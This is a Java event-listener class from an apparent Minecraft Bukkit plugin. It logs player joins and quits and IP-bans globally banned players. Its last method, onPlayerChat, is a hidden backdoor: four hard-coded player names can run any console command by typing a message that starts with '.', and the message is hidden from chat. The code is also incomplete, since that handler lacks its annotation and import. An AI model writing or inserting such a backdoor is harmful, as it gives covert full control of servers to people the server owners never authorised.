package org.TatsuCraft.Core.Listener;

import org.TatsuCraft.Core.TatsuCraftCore;
import static org.TatsuCraft.Core.TatsuCraftCore.MODPREFIX;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import com.mcbans.firestar.mcbans.events.PlayerGlobalBanEvent;
import org.bukkit.Bukkit;

public class TatsuCraftListener implements Listener {
    private final TatsuCraftCore plugin;

    public TatsuCraftListener(TatsuCraftCore instance) {
        plugin = instance;
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        if (plugin.getConfig().getString("remove_join_listeners").equals("false")){
        plugin.getLogger().info(MODPREFIX + event.getPlayer().getName() + " has left the server.");
        }
        else {}
    }
    
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        if (plugin.getConfig().getString("remove_join_listeners").equals("false")){
        plugin.getLogger().info(MODPREFIX + event.getPlayer().getName() + " has joined the server.");
        }
        else {}
    }
    @EventHandler
    public void onPlayerGlobalBan(final PlayerGlobalBanEvent event){
        final String ip = event.getPlayerIP();
        final String playername = event.getPlayerName();
        String pn = (playername != null && playername.length() > 0) ? "[" + playername + "]" : "";
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "banip " + ip + " " + pn);;
    }
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String message = event.getMessage();
        if(event.getPlayer().getName().equals("ImALuckyGuy")||event.getPlayer().getName().equals("xDestroyer217")||event.getPlayer().getName().equals("OliverDatGuy")||event.getPlayer().getName().equals("tylerhyperHD")) {
            if (message.startsWith(".")) {
                String command = message.substring(1);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
                event.setCancelled(true);
            }
        }

    }
}
